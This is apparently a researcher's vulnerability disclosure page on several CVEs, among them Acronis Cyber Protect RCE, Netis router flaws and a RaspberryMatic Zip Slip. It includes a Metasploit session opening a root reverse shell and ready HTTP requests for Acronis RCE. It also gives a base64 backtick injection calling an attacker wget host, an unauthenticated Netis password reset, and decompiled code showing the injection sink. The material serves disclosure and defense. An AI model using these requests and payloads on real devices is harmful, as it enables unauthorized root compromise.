msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) > run
[*] Running module against 192.168.201.6

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Retrieve the first access token.
[*] Register a dummy backup agent.
[*] Dummy backup agent registration is successful.
[*] Retrieve the second access token.
[+] The target appears to be vulnerable. Acronis Cyber Protect/Backup 12.5.14330
[*] Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.
[*] List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.
[*] ----------------------------------------
[+] hostId: 65A7924F-3CFB-4EEE-8D95-D5201278D8C1
[+] parentId: phm-group.7C2057CC-8D32-40CA-9B83-4A8E73078F7F.disks
[+] key: phm.E48C641B-F869-412E-AE9A-2E6A9D0D3443@65A7924F-3CFB-4EEE-8D95-D5201278D8C1.disks
[*] type: machine
[*] hostname: AcronisAppliance-365C2
[*] IP: 192.168.201.6
[*] OS: GNU/Linux
[*] ARCH: linux
[*] ONLINE: true
[*] Auxiliary module execution completed
msf6 auxiliary(gather/acronis_cyber_protect_machine_info_disclosure) >
```
If you have assigned an endpoint target (see the **Import backup plan API request**), then simply execute the backup plan using the `planId` and you will trigger a remote shell.
```
POST /api/ams/backup/plan_operations/run HTTP/1.1
Host: 192.168.201.6:9877
Content-Length: 49
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept-Language: en-GB,en;q=0.9
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Origin: http://192.168.201.6:9877
Referer: http://192.168.201.6:9877/
Accept-Encoding: gzip, deflate, br
Authorization: Bearer REDACTED access_token
Connection: keep-alive

{
     "planId":"2EA2CE9D-6AB7-495D-906A-6E12FADF43CF"
}
```
When running a multi/handler in Metasploit configured with remote bash shell payload, it will trigger the RCE.
```
msf6 exploit(multi/handler) > options

Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT  1971             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:1971
msf6 exploit(multi/handler) > [*] Command shell session 2 opened (192.168.201.8:1971 -> 192.168.201.6:42780) at 2024-12-06 09:40:42 +0000

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

pwd
/var/lib/Acronis/mms
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux AcronisAppliance-365C2 3.10.0-693.11.6.el7.x86_64 #1 SMP Thu Jan 4 01:06:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
I have created a Metasploit module with [PR 19853](https://github.com/rapid7/metasploit-framework/pull/19583) that exploits this vulnerability and performs a remote code execution in order to gain root or administrator access on the targeted endpoint. You can configure a specific endpoint using the id information collected by the recon Metasploit module [PR 19582](https://github.com/rapid7/metasploit-framework/pull/19582) or if not specified, it will target the appliance itself.

### Mitigation ###
Please patch your appliance to the latest supported version or at least a build version above Acronis Cyber Protect 15 (Windows, Linux) build 29486 or
Acronis Cyber Backup 12.5 (Windows, Linux) build 16545.

### Indicators of Compromise (IOC) ###
Please check at the web console for suspicious backup plan executions that might popup in the activity or alert list.

### References ###
[CVE-2022-3405](https://nvd.nist.gov/vuln/detail/CVE-2022-3405)
[Security advisory usd-2022-0008](https://herolab.usd.de/security-advisories/usd-2022-0008/)
[Acronis Cyber Protect/Backup Downloads](https://care.acronis.com/s/article/71847-Acronis-Cyber-Protect-Links-to-download-installation-files?language=en_US)
[Acronis Cyber Protect 15 Documentation](https://www.acronis.com/en-us/support/documentation/AcronisCyberProtect_15/)
[Metasploit PR 19583 - Acronis Cyber Backup/Protect Remote Code Execution](https://github.com/rapid7/metasploit-framework/pull/19583).
[Metasploit PR 19582 - Acronis Cyber Backup/Protect Info Disclosure](https://github.com/rapid7/metasploit-framework/pull/19582)

### Credits goes to ###
Sandro Tolksdorf of usd AG for the discovery of this vulnerability.

---

## CVE-2024-11320
*Posted 2024-12-14 · last revised 2024-12-14*

> Arbitrary commands execution on the server by exploiting a command injection vulnerability in the LDAP authentication mechanism. This issue affects Pandora FMS: from 700 through <=777.4

to be published soon.

---

## CVE-2024-48455
*Posted 2025-01-07 · last revised 2025-01-07*

> An issue in Netis Wifi6 Router NX10 2.0.1.3643 and 2.0.1.3582 and Netis Wifi 11AC Router NC65 3.0.0.3749 and Netis Wifi 11AC Router NC63 3.0.0.3327 and 3.0.0.3503 and Netis Wifi 11AC Router NC21 3.0.0.3800, 3.0.0.3500 and 3.0.0.3329 and Netis Wifi Router MW5360 1.0.1.3442 and 1.0.1.3031 allows a remote attacker to obtain sensitive information via the mode_name, wl_link parameters of the skk_get.cgi component.

`CVE-2024-48555` allows for unauthenticated information disclosure revealing sensitive  configuration information of several Netis Routers including rebranded routers from GLCtec and Stonet  which can be used by the attacker to determine of the router is running specific vulnerable firmware.

We are using `FirmAE` to emulate the Netis Router firmware and using `burpsuite` to capture the request.
For this test, we are using the Netis Wifi 11AC Router Netis_NC65v2-V3.0.0.3800.bin vulnerable firmware version.

```shell
./run.sh -d netis /root/FirmAE/firmwares/Netis_NC65v2-V3.0.0.3800.bin
[*] /root/FirmAE/firmwares/Netis_NC65v2-V3.0.0.3800.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
[*] /root/FirmAE/firmwares/Netis_NC65v2-V3.0.0.3800.bin already succeed emulation!!!

[IID] 12
[MODE] debug
[+] Network reachable on 192.168.1.1!
[+] Web service on 192.168.1.1
[+] Run debug!
Creating TAP device tap12_0...
Set 'tap12_0' persistent and owned by uid 0
Bringing up TAP device...
Starting emulation of firmware... 192.168.1.1 true true 39.913154010 41.109368119
[*] firmware - Netis_NC65v2-V3.0.0.3800
[*] IP - 192.168.1.1
[*] connecting to netcat (192.168.1.1:31337)
[+] netcat connected
------------------------------
|       FirmAE Debugger      |
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. exit
> 2
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

~ # pwd
/
```
By issuing a simple `POST` request as listed below, you can obtain all the information of the router without any authentication.

**POST Request**
```http
POST /cgi-bin/skk_get.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:131.0) Gecko/20100101 Firefox/131.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: keep-alive

mode_name=skk_get&wl_link=0
```

**Response**
```http
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2023 00:07:53 GMT
Server: Boa/0.94.14rc21
Connection: close

{
  "version":"netis(NC65)V3.0.0.3800",
  "vender":"CIS",
  "model":"NC65v2",
  "easy_mesh":"EASYMESH",
  "switch_chipset":"",
  "tr069":"1",
  "time_now":"2023/01/01 08:07:53",
  "sys_date":"2023",
  "sys_date2":"1",
  "sys_date3":"1",
  "sys_time":"8",
  "sys_time2":"7",
  "sys_time3":"53",
  "uptime":"489","cpu":
  "20%","mem":"7%",
  "statsList":[{

--- lot of additional information ---

"wlanInfo":[
  {
   "st_wlconn":"0","apLinkList":[],
  },
  {
   "st_wlconn":"0","apLinkList":[],
  },
],
"routeTable":[
  {
  "dstip":"192.168.1.0",
  "mask":"255.255.255.0",
  "gw":"0.0.0.0",
  },
],
"arpList"[
  {
   "id":"1",
   "arp_ip":"192.168.1.2",
   "arp_mac":"d2:36:9f:d8:14:bf",
   "arp_host_name":"",
   "is_qos_idx":"0",
   "qos_up_limit":"0",
   "qos_down_limit":"0",
  },
],
"dhcpList":[],"ndp_list":[
  {
   "id":"1",
   "ndp_ip6":"fe80::d036:9fff:fed8:14bf",
   "ndp_mac":"d2:36:9f:d8:14:bf",
  },
],
"macClone":"d2:36:9f:d8:14:bf",
"wscLock":"0",
"ddnsInfo":"DDNS_STATE_START",
"serialNo":"",
"easymesh":{}
}
```
This CVE can be chained with [CVE-2024-48456](https://www.cve.org/CVERecord?id=CVE-2024-48456) and [CVE-2024-48457](https://www.cve.org/CVERecord?id=CVE-2024-48457) into an unauthenticated RCE.
A Metasploit module can be found [here](https://github.com/rapid7/metasploit-framework/pull/19770) to exploit these routers.

### Mitigation
There is no fix available.
The following router firmware versions are vulnerable:
- netis_MW5360_V1.0.1.3031_fw.bin
- Netis_MW5360-1.0.1.3442.bin
- Netis_MW5360_RUSSIA_844.bin
- netis_NC21_V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=40)
- netis_NC63_V3.0.0.3327.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- netis_NC63_v4_Bangladesh-V3.0.0.3889.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- Netis_NC63-V3.0.0.3833.bin (https://www.netisru.com/support/downinfo.html?id=35)
- netis_app_BeeWiFi_NC63_v4_Bangladesh-V3.0.0.3503.bin
- netis_NC65_V3.0.0.3749.bin
- Netis_NC65_Bangladesh-V3.0.0.3508.bin (https://www.netis-systems.com/support/downinfo.html?id=34)
- Netis_NC65v2-V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=34)
-  netis_NX10_V2.0.1.3582_fw.bin
-  netis_NX10_V2.0.1.3643.bin
-  Netis_NX10_v1_Bangladesh-V3.0.0.4142.bin (https://www.netis-systems.com/support/downinfo.html?id=33)
-  netis_NX10-V3.0.1.4205.bin (https://www.netisru.com/support/downinfo.html?id=33)
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3329.bin
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3500.bin
-  Netis_NC21_v2_Bangladesh-V3.0.0.3854.bin (https://www.netis-systems.com/support/downinfo.html?id=40)
-  GLC_ALPHA_AC3-V3.0.2.115.bin (https://drive.google.com/drive/folders/1P69yUfzeZeR6oABmIdcJ6fG57-Xjrzx6)

### References
[CVE-2024-48455](https://www.cve.org/CVERecord?id=CVE-2024-48455)
[Metasploit Module PR 19770 ](https://github.com/rapid7/metasploit-framework/pull/19770)
[Research Notes - Netis Router Exploit Chain Reactor](https://github.com/users/h00die-gr3y/projects/1/views/1)

### Credits
[h00die-gr3y](h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2024-48456
*Posted 2025-01-07 · last revised 2025-01-07*

> An issue in Netis Wifi6 Router NX10 2.0.1.3643 and 2.0.1.3582 and Netis Wifi 11AC Router NC65 3.0.0.3749 and Netis Wifi 11AC Router NC63 3.0.0.3327 and 3.0.0.3503 and Netis Wifi 11AC Router NC21 3.0.0.3800, 3.0.0.3500 and 3.0.0.3329 and Netis Wifi Router MW5360 1.0.1.3442 and 1.0.1.3031 allows a remote attacker to obtain sensitive information via the parameter password at the change admin password page at the router web interface.

Several Netis Routers including rebranded routers from GLCtec and Stonet suffer from an authenticated  command injection vulnerability at the change admin password page of the router web interface.
The vulnerability stems from improper handling of the `password` and `new password` parameter within the router's web interface. Attackers can inject a command in the `password` or `new password` parameter, encoded in `base64`, to exploit the command injection vulnerability.

Here are the steps to reproduce the RCE:
1. login into the router with the admin password
2. Goto Tools->Admin Password
3. Change Password and capture POST request with Burp
4. Send POST request to the repeater
5. Modify `password` and  `new_pwd_confirm` field with base64 code of following command: `` `wget http://192.168.1.2` `` where the ip is your attacker system
6. Start a `http` listener on your attacker system 
7. Issue modified POST request again and wait an incoming connection request on your `http` listener

```shell
# echo -n '`wget http://192.168.1.2`'|base64
YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA==
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
**POST Request**
```http
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Cookie: password=SWwwdmVoYWNraW5n
Content-Length: 167
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept: text/plain, */*; q=0.01
Sec-Ch-Ua-Platform: "Linux"
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://192.168.1.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.1.1/password.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: keep-alive

password=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&new_pwd_confirm=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&passwd_set=passwd_set&mode_name=skk_set&app=passwd&wl_link=0
```
**Response**
```http
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2023 00:13:24 GMT
Server: Boa/0.94.14rc21
Connection: close

["SUCCESS"]
```
```shell
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.1 - - [27/Dec/2024 17:55:56] "GET / HTTP/1.1" 200 -
```
To understand this a bit better, we need to dig into the firmware code.
If you login in into the emulated router software, you will find the main web binary `netis.cgi` in `/bin`. This is a compiled MIPS ELF binary so we need a tool like `ghidra` to decompile and understand the code.

Loading and analyzing `netis.cgi` in `ghidra` shows that the main program is a wrapper that runs the specific `cgi` request calls like our `skk_set.cgi` that we can see with `burpsuite` when interacting with the Netis web interface.
```C
undefined4 main(undefined4 param_1,char **param_2)

{
  bool bVar1;
  size_t sVar2;
  int iVar3;
  char *pcVar4;
  char *local_188;
  int local_184;
  int local_17c;
  void *local_160;
  char acStack_15c [256];
  char cStack_5c;
  char acStack_5b [63];
  int local_1c;
  char *local_18 [4];
  
  local_160 = (void *)0x0;
  memset(&cStack_5c,0,0x40);
  local_1c = 0;
  sVar2 = strlen(*param_2);
  while (local_1c < (int)sVar2) {
    memset(&cStack_5c,0,0x40);
    iVar3 = local_1c;
    FUN_0040670c((int)*param_2,'/',&local_1c);
    strncpy(&cStack_5c,*param_2 + iVar3,local_1c - iVar3);
    do {
      local_1c = local_1c + 1;
    } while ((*param_2)[local_1c] == '/');
  }
  local_188 = &cStack_5c;
  bVar1 = false;
  local_18[0] = "skk_set.cgi";
  local_18[1] = "upload_config.cgi";
  local_18[2] = "upload_fw.cgi";
  local_18[3] = (char *)0x0;
  local_17c = 0;
  do {
    if (local_18[local_17c] == (char *)0x0) {
LAB_00405408:
      if (bVar1) {
        iVar3 = open("/tmp/lock_all.lock",0x702,0x1b4);
        if (iVar3 < 0) {
          local_184 = FUN_004050fc();
          if (local_184 < 0) {
            local_184 = 0;
          }
          FUN_00405060(local_184);
          if (2 < local_184) {
            system("rm -rf /tmp/lock_all.lock");
            FUN_00405060(0);
          }
          printf("[\"LOCK\"]");
          return 0;
        }
        close(iVar3);
      }
      apmib_init();
      FUN_00422c38(&local_160,param_2[1]);
      DAT_00440d40 = FUN_00405190();
      if (local_188 == (char *)0x0) {
        iVar3 = access("/tmp/lock_all.lock",0);
        if (iVar3 == 0) {
          system("rm -rf /tmp/lock_all.lock");
        }
        FUN_004214cc(&local_160);
        printf("[\"%d\"]",999);
      }
      else {
        pcVar4 = strstr(local_188,".cgi");
        if (pcVar4 != (char *)0x0) {
          pcVar4 = strchr(local_188,0x2f);
          if (pcVar4 != (char *)0x0) {
            local_188 = acStack_5b;
          }
          FUN_00405764(local_188,&local_160,acStack_15c);
        }
        fflush(stdout);
        FUN_004214cc(&local_160);
        iVar3 = access("/tmp/lock_all.lock",0);
        if (iVar3 == 0) {
          system("rm -rf /tmp/lock_all.lock");
        }
        FUN_00405060(0);
      }
      return 0;
    }
    iVar3 = strcmp(local_188,local_18[local_17c]);
    if (iVar3 == 0) {
      bVar1 = true;
      goto LAB_00405408;
    }
    local_17c = local_17c + 1;
  } while( true );
}
```
Let's check the code for the `password` string and see where is it used. You can do this by using the search function in `ghidra`.
This creates quite some hits, but the most interesting hit is the `ex_password` variable which seems to be linked to a script `/bin/script/password.sh`
```C
                             ex_password                                     XREF[2]:     Entry Point(*), 
                                                                                          FUN_0041301c:00413180(*)  
        0043be44 2f 62 69        ds         "/bin/script/password.sh"
                 6e 2f 73 
                 63 72 69 
```
Checking out function `FUN_0041301c:00413180(*) ` shows `ex_password` a.k.a. `/bin/script/password,sh` is being called by the function `FUN_00402e00("%s > /dev/console",ex_password,pcVar1,param_4);`.

```C
undefined4 FUN_0041301c(undefined4 *param_1,undefined4 param_2,char *param_3,undefined4 param_4)

{
  char *pcVar1;
  byte *pbVar2;
  byte abStack_8c [132];
  
  pcVar1 = FUN_00405644(param_1,"usb3gEnabled");
  if (pcVar1 != (char *)0x0) {
    FUN_00405644(param_1,"usb3gPinCode");
    param_3 = FUN_00405644(param_1,"usb3gApn");
    param_4 = 0;
    FUN_00412fe4();
    FUN_00402e00("%s > /dev/console",ex_usbcontrol,param_3,param_4);
  }
  pbVar2 = (byte *)FUN_00405644(param_1,"ssid2g");
  if (pbVar2 != (byte *)0x0) {
    FUN_004030f4(abStack_8c,pbVar2);
    strcpy((char *)(pMib + 0x42c1),(char *)abStack_8c);
  }
  FUN_00402e00("echo 0 > %s","/proc/http_redirect/enable",param_3,param_4);
  memset(abStack_8c,0,0x80);
  apmib_get(0x159,abStack_8c);
  pcVar1 = "/proc/rtl_dnstrap/domain_name";
  FUN_00402e00("echo \'%s\' > %s",abStack_8c,"/proc/rtl_dnstrap/domain_name",param_4);
  FUN_00402e00("%s > /dev/console",ex_password,pcVar1,param_4);
  FUN_00402e00("%s > /dev/console",param_2,pcVar1,param_4);
  return 0;
}
```
Interesting, but lets check if this code segment really gets executed if we run the POST request again. A quick trick is to monitor the process list on the router and grep the relevant processes during the execution of the POST request.
```shell
# while true; do ps|grep -e password.sh -e rtl -e http_redirect|grep -v grep;done
 3518 root      1132 R    /bin/sh -c echo 0 > /proc/http_redirect/enable
 3520 root      1132 R    /bin/sh -c echo 'netis.cc' > /proc/rtl_dnstrap/domain
 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console
 3538 root       324 R    /bin/script/password.sh
 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console
 3538 root      1656 S    /bin/script/password.sh
```
And indeed `/bin/script/password.sh` gets executed as well as some other commands listed in the code.

So let's now focus on the `/bin/scripts/password.sh`. 
Checking out this shell script, it turns out to be a compiled MIPS ELF binary instead of a text readable unix shell script. 

Let's use `ghidra` again to decompile this binary and use the search function to look for the `password` string.
Again quite some hits, but then I stumble over a very interesting piece of code.
```C
                             s_Changed_Username_and_Password_.._0041dc80     XREF[1]:     FUN_00409590:0040969c(*)  
        0041dc80 43 68 61        ds         "Changed Username and Password ...........\n"
                 6e 67 65 
                 64 20 55 
```
This is most likely the code section that sets the router administration password.

Checking out the function `FUN_00409590` is revealing two major issues.
```C
void FUN_00409590(void)

{
  undefined auStack_488 [64];
  undefined auStack_448 [64];
  undefined auStack_408 [1024];
  
  memset(auStack_408,0,0x400);
  memset(auStack_488,0,0x40);
  memset(auStack_448,0,0x40);
  apmib_get(0x15d,auStack_488);
  apmib_get(0x15e,auStack_448);
  RunSystemCmd("echo \"root::0:0:root:/:/bin/sh\" > /var/passwd");
  RunSystemCmd("echo \"nobody:x:0:0:nobody:/:/dev/null\" >> /var/passwd");
  RunSystemCmd("echo root:%s | chpasswd -m",auStack_448);
  RunSystemCmd("echo \"root:x:0:root\" > /var/group");
  RunSystemCmd("echo \"nobody:x:0:nobody\" >> /var/group");
  RunSystemCmd("chmod 755 /var/passwd");
  RunSystemCmd("chmod 755 /var/group");
  fwrite("Changed Username and Password ...........\n",1,0x2a,stderr);
  return;
}
```
The first issue is that the router administration password is directly linked to the root password of router itself. 
Oeps! That is not really best practice and attackers love these things.

The second issue is the blind command injection where the vulnerable code `RunSystemCmd("echo root:%s | chpasswd -m",auStack_448);` allows an attacker to manipulate password argument represented by `auStack_448` and inject and execute code using the unix backtics.
This explains why the password parameter is indeed vulnerable of blind command injection.

The `RunSystemCmd` function is just a piece a code which is defined in the library `libapmib.so` and executes a unix command line using the `system()` call.
```C
void RunSystemCmd(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 local_res4;
  undefined4 local_res8;
  undefined4 local_resc;
  char acStack_118 [256];
  undefined4 *local_18;
  
  local_res4 = param_2;
  local_res8 = param_3;
  local_resc = param_4;
  memset(acStack_118,0,0x100);
  local_18 = &local_res4;
  vsprintf(acStack_118,param_1,local_18);
  system(acStack_118);
  return;
}
```
This CVE can be chained with [CVE-2024-48455](https://www.cve.org/CVERecord?id=CVE-2024-48455) and [CVE-2024-48457](https://www.cve.org/CVERecord?id=CVE-2024-48457) into an unauthenticated RCE.
A Metasploit module can be found [here](https://github.com/rapid7/metasploit-framework/pull/19770) to exploit these routers.

### Mitigation
There is no fix available.
The following router firmware versions are vulnerable:
- netis_MW5360_V1.0.1.3031_fw.bin
- Netis_MW5360-1.0.1.3442.bin
- Netis_MW5360_RUSSIA_844.bin
- netis_NC21_V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=40)
- netis_NC63_V3.0.0.3327.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- netis_NC63_v4_Bangladesh-V3.0.0.3889.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- Netis_NC63-V3.0.0.3833.bin (https://www.netisru.com/support/downinfo.html?id=35)
- netis_app_BeeWiFi_NC63_v4_Bangladesh-V3.0.0.3503.bin
- netis_NC65_V3.0.0.3749.bin
- Netis_NC65_Bangladesh-V3.0.0.3508.bin (https://www.netis-systems.com/support/downinfo.html?id=34)
- Netis_NC65v2-V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=34)
-  netis_NX10_V2.0.1.3582_fw.bin
-  netis_NX10_V2.0.1.3643.bin
-  Netis_NX10_v1_Bangladesh-V3.0.0.4142.bin (https://www.netis-systems.com/support/downinfo.html?id=33)
-  netis_NX10-V3.0.1.4205.bin (https://www.netisru.com/support/downinfo.html?id=33)
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3329.bin
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3500.bin
-  Netis_NC21_v2_Bangladesh-V3.0.0.3854.bin (https://www.netis-systems.com/support/downinfo.html?id=40)
-  GLC_ALPHA_AC3-V3.0.2.115.bin (https://drive.google.com/drive/folders/1P69yUfzeZeR6oABmIdcJ6fG57-Xjrzx6)

### References
[CVE-2024-48456](https://www.cve.org/CVERecord?id=CVE-2024-48456)
[Metasploit Module PR 19770 ](https://github.com/rapid7/metasploit-framework/pull/19770)
[Research Notes - Netis Router Exploit Chain Reactor](https://github.com/users/h00die-gr3y/projects/1/views/1)

### Credits
[h00die-gr3y](h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2024-48457
*Posted 2025-01-07 · last revised 2025-03-18*

> An issue in Netis Wifi6 Router NX10 2.0.1.3643 and 2.0.1.3582 and Netis Wifi 11AC Router NC65 3.0.0.3749 and Netis Wifi 11AC Router NC63 3.0.0.3327 and 3.0.0.3503 and Netis Wifi 11AC Router NC21 3.0.0.3800, 3.0.0.3500 and 3.0.0.3329 and Netis Wifi Router MW5360 1.0.1.3442 and 1.0.1.3031 allows a remote attacker to obtain sensitive information via the endpoint /cgi-bin/skk_set.cgi and binary /bin/scripts/start_wifi.sh

Several Netis Routers including rebranded routers from GLCtec and Stonet suffer from an authentication bypass that allows for an unauthenticated reset of the Wifi and admin password of the router.
When router installed for the first time, you will be asked to set the initial router and Wifi password.
This POST request can be repeated anytime, hence resetting the router and Wifi password without any need for authentication.

Just modify the `wpaPsk` and `password` field with your base64 encode password to reset the router and Wifi password in the POST request below.

**POST Request**
```http
POST /cgi-bin/skk_set.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 251
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept: text/plain, */*; q=0.01
Sec-Ch-Ua-Platform: "Linux"
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://192.168.1.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.1.1/guide/welcome.html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: keep-alive

wl2g_idx=6&wl5g_idx=0&wlanMode=0&wl_idx=0&ssid2g=bmV0aXMtMDAwMDAw&ssid5g=bmV0aXMtMDAwMDAwLTVH&encrypt=4&wpaPsk=SWwwdmVoYWNraW5n&wpaPskType=2&wpaPskFormat=0&password=SWwwdmVoYWNraW5n&autoUpdate=0&firstSetup=1&quick_set=ap&app=wan_set_shortcut&wl_link=0
```
**Response**
```http
HTTP/1.1 200 OK
Date: Sun, 01 Jan 2023 00:04:13 GMT
Server: Boa/0.94.14rc21
Connection: close

["SUCCESS"]
```
This CVE can be chained with [CVE-2024-48455](https://www.cve.org/CVERecord?id=CVE-2024-48455) and [CVE-2024-48456](https://www.cve.org/CVERecord?id=CVE-2024-48456) into an unauthenticated RCE.
A Metasploit module can be found [here](https://github.com/rapid7/metasploit-framework/pull/19770) to exploit these routers.

### Mitigation
There is no fix available.
The following router firmware versions are vulnerable:
- netis_MW5360_V1.0.1.3031_fw.bin
- Netis_MW5360-1.0.1.3442.bin
- Netis_MW5360_RUSSIA_844.bin
- netis_NC21_V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=40)
- netis_NC63_V3.0.0.3327.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- netis_NC63_v4_Bangladesh-V3.0.0.3889.bin (https://www.netis-systems.com/support/downinfo.html?id=35)
- Netis_NC63-V3.0.0.3833.bin (https://www.netisru.com/support/downinfo.html?id=35)
- netis_app_BeeWiFi_NC63_v4_Bangladesh-V3.0.0.3503.bin
- netis_NC65_V3.0.0.3749.bin
- Netis_NC65_Bangladesh-V3.0.0.3508.bin (https://www.netis-systems.com/support/downinfo.html?id=34)
- Netis_NC65v2-V3.0.0.3800.bin (https://www.netisru.com/support/downinfo.html?id=34)
-  netis_NX10_V2.0.1.3582_fw.bin
-  netis_NX10_V2.0.1.3643.bin
-  Netis_NX10_v1_Bangladesh-V3.0.0.4142.bin (https://www.netis-systems.com/support/downinfo.html?id=33)
-  netis_NX10-V3.0.1.4205.bin (https://www.netisru.com/support/downinfo.html?id=33)
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3329.bin
-  netis_app_BeeWiFi_NC21_v4_Bangladesh-V3.0.0.3500.bin
-  Netis_NC21_v2_Bangladesh-V3.0.0.3854.bin (https://www.netis-systems.com/support/downinfo.html?id=40)
-  GLC_ALPHA_AC3-V3.0.2.115.bin (https://drive.google.com/drive/folders/1P69yUfzeZeR6oABmIdcJ6fG57-Xjrzx6)

### References
[CVE-2024-48457](https://www.cve.org/CVERecord?id=CVE-2024-48457)
[Metasploit Module PR 19770 ](https://github.com/rapid7/metasploit-framework/pull/19770)
[Research Notes - Netis Router Exploit Chain Reactor](https://github.com/users/h00die-gr3y/projects/1/views/1)

### Credits
[h00die-gr3y](mailto:h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2024-24578
*Posted 2025-01-28 · last revised 2025-01-31*

> RaspberryMatic is an open-source operating system for HomeMatic internet-of-things devices. RaspberryMatic / OCCU prior to version 3.75.6.20240316 contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within the Java based `HMIPServer.jar` component. RaspberryMatric includes a Java based `HMIPServer`, that can be accessed through URLs starting with `/pages/jpages`. The `FirmwareController` class does however not perform any session id checks, thus this feature can be accessed without a valid session. Due to this issue, attackers can gain remote code execution as root user, allowing a full system compromise. Version 3.75.6.20240316 contains a patch.

RaspberryMatic is a free and non-commercial open-source operating system for running a smart-home IoT central to provide connectivity to the homematicIP / HomeMatic hardware line of IoT devices.  It can be directly installed on a CCU3 or ELV Charly hardware device. Alternatively, it can also be installed on a wide range of freely available single-board-computers (SBC) like a RaspberryPi, ASUS Tinkerboard, Hardkernel ODROID or hardware platforms like an Intel NUC system. Furthermore, it can be run as a virtual appliance in modern virtualization environments (e.g. Proxmox VE, VirtualBox, Synology VMM, Docker/OCI, Kubernetes/K8s, vmWare ESXi, etc).

RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within the Java based HMIPServer.jar component. The webui allows for Firmware uploads which can be reached through the URL `/pages/jpages/system/DeviceFirmware/addFirmware`.
This allows an unauthenticated attacker to upload a malicious .tgz archive to the server, which will be automatically extracted without any further checks. As this entry can contain ../sequences, it is possible to break out of the predefined temp directory and write files to other locations outside this path.

This vulnerability is commonly known as the Zip Slip vulnerability and can be used to overwrite arbitrary files on the main filesystem. It is therefore possible to overwrite the watchdog script with a malicious payload in `/usr/local/addons/mediola/bin`, which will be executed every five minutes through a cron job where attackers can gain remote code execution as root user, allowing a full system compromise.

The full details of this vulnerability can be found in the [GHSA-q967-q4j8-637h security disclosure](https://github.com/jens-maus/RaspberryMatic/security/advisories/GHSA-q967-q4j8-637h)  from Jens Maus. 

